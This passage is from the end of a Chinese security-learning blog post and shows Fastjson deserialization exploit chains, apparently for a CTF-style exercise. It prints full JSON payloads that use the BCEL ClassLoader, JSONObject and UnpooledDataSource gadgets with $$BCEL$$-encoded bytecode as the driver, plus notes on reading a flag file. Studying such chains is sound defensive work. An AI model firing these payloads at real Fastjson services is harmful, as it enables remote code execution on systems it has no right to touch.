class="hljs-variable">$a2</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$404</span><span class="hljs-variable">$7c5</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$Zn</span><span class="hljs-variable">$99</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$caM</span><span class="hljs-variable">$3av</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$dfSq</span><span class="hljs-variable">$I</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$Khw</span><span class="hljs-variable">$91muUVn</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$96</span><span class="hljs-variable">$zHhb</span><span class="hljs-variable">$91</span><span class="hljs-variable">$iGV</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$40t</span><span class="hljs-variable">$82</span><span class="hljs-variable">$88a9</span><span class="hljs-variable">$kG</span><span class="hljs-variable">$l</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$G</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$R</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$82</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$jQ</span><span class="hljs-variable">$u</span><span class="hljs-variable">$84</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$g</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$ebh</span><span class="hljs-variable">$v</span><span class="hljs-variable">$n</span><span class="hljs-variable">$U</span><span class="hljs-variable">$P</span><span class="hljs-variable">$97</span><span class="hljs-variable">$QI</span><span class="hljs-variable">$P</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$60</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c8SC</span><span class="hljs-variable">$S</span><span class="hljs-variable">$cdZKP</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$87K</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$TW</span><span class="hljs-variable">$x</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$de</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$w</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$K</span><span class="hljs-variable">$97</span><span class="hljs-variable">$F</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$g</span><span class="hljs-variable">$F</span><span class="hljs-variable">$R</span><span class="hljs-variable">$z</span><span class="hljs-variable">$y</span><span class="hljs-variable">$qma</span><span class="hljs-variable">$92</span><span class="hljs-variable">$y</span><span class="hljs-variable">$85</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b1LY</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$85i</span><span class="hljs-variable">$ddJ</span><span class="hljs-variable">$ebvZ</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$QKE</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$60</span><span class="hljs-variable">$f1x</span><span class="hljs-variable">$w</span><span class="hljs-variable">$g</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$89</span><span class="hljs-variable">$YI</span><span class="hljs-variable">$3a2K</span><span class="hljs-variable">$e1xgf</span><span class="hljs-variable">$v</span><span class="hljs-variable">$a2E3</span><span class="hljs-variable">$v</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$j</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$96</span><span class="hljs-variable">$aec</span><span class="hljs-variable">$bfF</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$P</span><span class="hljs-variable">$94</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$NZ</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$60</span><span class="hljs-variable">$J</span><span class="hljs-variable">$87J</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$p</span><span class="hljs-variable">$rk</span><span class="hljs-variable">$R</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$96o</span><span class="hljs-variable">$zRu</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$L</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$a9V</span><span class="hljs-variable">$adU</span><span class="hljs-variable">$93K</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$I8</span><span class="hljs-variable">$o</span><span class="hljs-variable">$86</span><span class="hljs-variable">$beo</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$n</span><span class="hljs-variable">$dcM</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$i</span><span class="hljs-variable">$3ai</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$870b</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$88</span><span class="hljs-variable">$92</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$87</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$YC7</span><span class="hljs-variable">$3d0hX</span><span class="hljs-variable">$qt</span><span class="hljs-variable">$N</span><span class="hljs-variable">$87</span><span class="hljs-variable">$a9A</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$e0</span><span class="hljs-variable">$Kz</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$x</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$G</span><span class="hljs-variable">$R</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$Ti</span><span class="hljs-variable">$ffJ</span><span class="hljs-variable">$96</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c01</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$89</span><span class="hljs-variable">$E</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c2q</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$B</span><span class="hljs-variable">$x</span><span class="hljs-variable">$VB</span><span class="hljs-variable">$J</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$df</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$p</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$90H</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$84_0</span><span class="hljs-variable">$84</span><span class="hljs-variable">$e12</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$m</span><span class="hljs-variable">$89</span><span class="hljs-variable">$R</span><span class="hljs-variable">$8ac</span><span class="hljs-variable">$M_</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$k</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$85</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$d3U</span><span class="hljs-variable">$dcK</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$I</span><span class="hljs-variable">$f9Z</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$J</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$oJ</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$f44</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$A</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$m</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$H</span><span class="hljs-variable">$J</span><span class="hljs-variable">$93</span><span class="hljs-variable">$c9c</span><span class="hljs-variable">$i</span><span class="hljs-variable">$P</span><span class="hljs-variable">$e1aJ</span><span class="hljs-variable">$e6I</span><span class="hljs-variable">$b2</span><span class="hljs-variable">$de</span><span class="hljs-variable">$D</span><span class="hljs-variable">$e9_</span><span class="hljs-variable">$K</span><span class="hljs-variable">$8a1</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$YF</span><span class="hljs-variable">$ZN1</span><span class="hljs-variable">$3cR</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$91</span><span class="hljs-variable">$fcQ</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$aad</span><span class="hljs-variable">$f34</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$sp</span><span class="hljs-variable">$86</span><span class="hljs-variable">$e28KX</span><span class="hljs-variable">$L</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$H</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$99</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$J</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.friend.connection&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;</code></pre></div>

<p>相比之前的数组，在原来的基础上添加了<code>.friend</code></p>
<p><code>&quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$.friend[1]&quot;&#125;,</code> </p>
<p><code>&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.friend.connection&quot;&#125;</code></p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924164904743.png" srcset="/img/loading.gif" lazyload alt="image-20230924164904743"></p>
<p>jar命令查看jar包里的文件</p>
<p>然后把脚本的注释部分（读取f1111ag.txt）去掉注释，再来一遍即可</p>
<h4 id="使用JSONObject调用getter"><a href="#使用JSONObject调用getter" class="headerlink" title="使用JSONObject调用getter"></a>使用JSONObject调用getter</h4><p>关键是设置<code>&quot;$ref&quot;: &quot;..&quot;</code>    </p>
<div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;friend&quot;</span>:&#123; <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>: &#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>: <span class="hljs-string">&quot;..&quot;</span> &#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$Am</span><span class="hljs-variable">$91</span><span class="hljs-variable">$ddN</span><span class="hljs-variable">$h1</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$85</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$93</span><span class="hljs-variable">$F</span><span class="hljs-variable">$c36</span><span class="hljs-variable">$U</span><span class="hljs-variable">$I</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$_</span><span class="hljs-variable">$BZ</span><span class="hljs-variable">$I</span><span class="hljs-variable">$m</span><span class="hljs-variable">$c8M</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$82P</span><span class="hljs-variable">$R</span><span class="hljs-variable">$C</span><span class="hljs-variable">$vR</span><span class="hljs-variable">$g</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$s</span><span class="hljs-variable">$82k</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$98</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$ae7</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$81</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$X</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$A</span><span class="hljs-variable">$PUu</span><span class="hljs-variable">$i</span><span class="hljs-variable">$w</span><span class="hljs-variable">$b2R</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$96</span><span class="hljs-variable">$f6h</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$B</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$Xl</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$98</span><span class="hljs-variable">$c4r</span><span class="hljs-variable">$8cWx</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$857A</span><span class="hljs-variable">$dfr</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$e3x</span><span class="hljs-variable">$cf0</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$af</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$H</span><span class="hljs-variable">$M</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$ZCt</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$U</span><span class="hljs-variable">$c3lS</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$ca</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$w</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$88</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$n</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$dctR</span><span class="hljs-variable">$983</span><span class="hljs-variable">$91</span><span class="hljs-variable">$e8P</span><span class="hljs-variable">$ff5</span><span class="hljs-variable">$p</span><span class="hljs-variable">$df</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$v</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$kjSg</span><span class="hljs-variable">$88</span><span class="hljs-variable">$8fo</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$gx</span><span class="hljs-variable">$edl</span><span class="hljs-variable">$ca</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$81</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$p</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$KG</span><span class="hljs-variable">$85c</span><span class="hljs-variable">$95zm</span><span class="hljs-variable">$97</span><span class="hljs-variable">$rR</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$O</span><span class="hljs-variable">$81</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$x1</span><span class="hljs-variable">$U</span><span class="hljs-variable">$rpLq</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$95</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$8eO</span><span class="hljs-variable">$M</span><span class="hljs-variable">$cbn</span><span class="hljs-variable">$a0leWTh</span><span class="hljs-variable">$98</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$T</span><span class="hljs-variable">$83A</span><span class="hljs-variable">$J</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$b1A</span><span class="hljs-variable">$f3B</span><span class="hljs-variable">$8ca</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$EkF</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$a5</span><span class="hljs-variable">$a4gX</span><span class="hljs-variable">$YY</span><span class="hljs-variable">$da</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$g</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$df</span><span class="hljs-variable">$c0P</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$83GF</span><span class="hljs-variable">$a4i</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$T</span><span class="hljs-variable">$97</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$i</span><span class="hljs-variable">$b22FZ</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$fe7</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$</span><span class="hljs-variable">$O</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$89D</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$g</span><span class="hljs-variable">$gWk</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$nm</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$3b</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$v</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$91</span><span class="hljs-variable">$NcTO</span><span class="hljs-variable">$98C</span><span class="hljs-variable">$vU</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$90</span><span class="hljs-variable">$f91</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$5e_</span><span class="hljs-variable">$d3Bb</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$b9X</span><span class="hljs-variable">$aan5</span><span class="hljs-variable">$ffah</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$91</span><span class="hljs-variable">$baQ</span><span class="hljs-variable">$92a</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$a2m</span><span class="hljs-variable">$af</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$P</span><span class="hljs-variable">$7cO</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$98X</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$w</span><span class="hljs-variable">$s</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$87</span><span class="hljs-variable">$87</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$80i</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$be</span><span class="hljs-variable">$922</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$97</span><span class="hljs-variable">$db</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$60</span><span class="hljs-variable">$3fQ</span><span class="hljs-variable">$u</span><span class="hljs-variable">$X</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$df</span><span class="hljs-variable">$92S</span><span class="hljs-variable">$40</span><span class="hljs-variable">$i</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$U</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$98A</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$_</span><span class="hljs-variable">$a8</span><span class="hljs-variable">$w</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$rHgF</span><span class="hljs-variable">$g</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$Jb</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$88</span><span class="hljs-variable">$vc</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$l</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$90</span><span class="hljs-variable">$ebu</span><span class="hljs-variable">$C</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>&#125;&#125;:<span class="hljs-string">&quot;x&quot;</span>&#125;&#125;,&#125;&#125;,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;</code></pre></div>

<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247486057&idx=1&sn=6799b8b77f058247705beaa6995dcb82&chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&mpshare=1&scene=2&srcid=1109kLt9Pm0fZdiqQ8zbB0IX&sharer_sharetime=1667995572392&sharer_shareid=917ce1404b071ce27556675ad135266f#rd">Java安全攻防之老版本Fastjson的一些不出网利用 (qq.com)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>跟着Y4tacker学java</div>
      <div>https://zer0peach.github.io/2023/09/18/跟着Y4tacker学java/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Zer0peach</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月18日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/" title="XPATH注入">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">XPATH注入</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/16/%E5%BC%80%E5%8F%91/" title="开发">
                        <span class="hidden-mobile">开发</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
    </div>
  
  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      
    </a>
  </span>
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
